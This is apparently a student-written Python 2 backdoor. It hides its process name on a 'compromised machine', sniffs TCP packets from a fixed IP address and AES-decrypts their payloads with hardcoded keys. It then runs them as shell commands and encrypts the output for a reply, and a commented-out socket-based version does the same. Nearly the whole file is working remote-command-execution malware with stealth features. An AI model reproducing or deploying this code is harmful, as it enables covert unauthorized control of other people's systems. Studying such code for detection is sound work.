import sys
import socket
import subprocess
import setproctitle
import time
from scapy.all import *
from Crypto.Cipher import AES
from Crypto import Random

#Change process name so that we can hide this program on a compromised machine
#Make it look like a legitimate process running in the background
#Usually we want to use something like kworker/2:1 to mask the program
title = "Backdoor"
setproctitle.setproctitle(title)

def usage():
    if len(sys.argv) != 2:
        print "To use: ", sys.argv[0], "[Server IP] [Server Port] [Client IP]"
        sys.exit()


#key to authenticating the packet
authPacket = "Authenticate packets"
#Encryption and decryption variables and initialization
secretKey = "Secret key lost."
saltySpatoon = "How tough areyou"
crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)

def server(pkt):
    #Instantiate variables
    decryptedData=""
    newData = ""
    #Grab the source IP for each packets
    src_ip = pkt[IP].src

    if src_ip == "192.168.0.14":
        #Grab the raw data
        data = pkt[Raw].load
        #Decrypt the raw data
        decryptedData = crypt.decrypt(data)
        #If the decrypted data is authenticated, print it
        if decryptedData.startswith(authPacket) == True:
            #Take out the authentication part
            newData = decryptedData[20:]
            #If we get exit command, exit out of the system
            if newData == "exit":
                time.sleep(2)
            else:
                #Run the command using a child process so that it is hidden
                process = subprocess.Popen(newData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                #Store the output of the command into output variable
                output = process.stdout.read() + process.stderr.read()
                #Encrypt the output and add the packet authenticator before sending back
                encryptedReply = crypt.encrypt(authPacket + output)
                #Create the output packet
                print output
                # pkt = IP(src="192.168.0.15", dst="192.168.0.14")/TCP()/Raw(load=encryptedReply)
                # #Send the packet
                # send(pkt)
        else:
            print decryptedData[20:]

if __name__ == "__main__":

    sniff(filter="tcp", prn=server)
























# def server(pkt):

# 	src_ip = pkt[IP].src
# 	dst_ip = pkt[IP].dst
# 	tcp_sport = pkt[TCP].sport
# 	tcp_dport = pkt[TCP].dport

# 	#Server connections
# 	#Will become command line arguments
# 	HOST = "127.0.0.1"
# 	PORT = 8509
# 	clientIP = ""

# 	#will change HOST into clientIP once in real network
# 	if src_ip == HOST and dst_ip == HOST:
# 		#Opening socket and listening on that socket
# 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 		s.bind((HOST, PORT))
# 		s.listen(1)
# 		#Accept connections
# 		conn, addr = s.accept()


# 		while True:
# 			#Receive the data from the client
# 			data = conn.recv(10240)
# 			#decrypts the data
# 			decryptedData = crypt.decrypt(data)

# 			if decryptedData.startswith(authPacket) == True:
# 				newData = decryptedData[20:]
# 				#if we receive exit, we send exit back to client first then exit the program
# 				if newData == "exit":
# 					encryptExit = crypt.encrypt(authPacket + newData)
# 					conn.send(encryptExit)
# 					#wait 2 seconds before closing server
# 					time.sleep(2)
# 					sys.exit()
# 				else:
# 					#Run the command using a child process so that it is hidden
# 					process = subprocess.Popen(newData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
# 					#Store the output of the command into output variable
# 					output = process.stdout.read() + process.stderr.read()
# 					#Encrypt the output and add the packet authenticator before sending back
# 					encryptedReply = crypt.encrypt(authPacket + output)
# 					conn.sendall(encryptedReply)
# 			else:
# 				print decryptedData

# sniff(filter="tcp", prn=server)
